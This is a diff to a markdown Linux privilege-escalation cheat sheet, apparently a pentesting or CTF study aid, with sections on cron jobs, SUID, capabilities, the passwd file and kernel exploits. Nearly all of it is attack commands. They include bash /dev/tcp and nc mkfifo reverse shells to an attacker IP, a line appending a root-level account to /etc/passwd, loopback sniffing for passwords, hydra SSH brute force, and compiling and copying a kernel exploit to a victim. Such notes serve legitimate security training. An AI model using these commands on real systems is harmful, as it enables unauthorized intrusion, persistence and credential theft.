@@ -59,23 +59,33 @@ hydra -l user -P wordlist $VictimIP -t 4 ssh -V
 ### Hidden passwords in Services
 
 ```
-sudo tcpdump -i lo -A | grep "pass"
 watch -n1 "ps aux | grep pass | grep -v grep | fold -s
+sudo tcpdump -i lo -A | grep "pass"
 ```
 
 ## Cron jobs
 
-Source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+If the cron job is writeable, add a reverse shell:
 ```
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1
+rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc $AttackerIp $AttackerPort > /tmp/f
 ```
+Rshells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 ## Passwd file
 
 ```
 openssl passwd passwordtohash
-echo "newadmin:somehaststring:0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "newadmin:somehashstring:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+## Capabilities
+
+References:
+- https://man7.org/linux/man-pages/man7/capabilities.7.html
+- https://gtfobins.github.io/
+```
+/usr/sbin/getcap -r / 2> /dev/null
 ```
 
 ## SUID
@@ -83,8 +93,8 @@ echo "newadmin:somehaststring:0:0:root:/root:/bin/bash" >> /etc/passwd
 Source: https://gtfobins.github.io/
 ```
 find / -perm /6000 -exec ls -ld {} \; # setuid + setgid
-grep Uid /proc/procnum/status
-ls -asl /usr/bin/somebin
+grep Uid /proc/some_proc_number/status
+ls -asl /usr/bin/some_binary
 ```
 
 ## Sudo
@@ -94,7 +104,7 @@ searchsploit -u
 searchsploit "Linux kernel 4.4.0 privilege escalation"
 cp /usr/share/exploitdb/exploits/linux/local/num.c .
 gcc num.c
-scp num.c victim@IP:
+scp a.out victim@IP:
 ./a.out
 ```
 
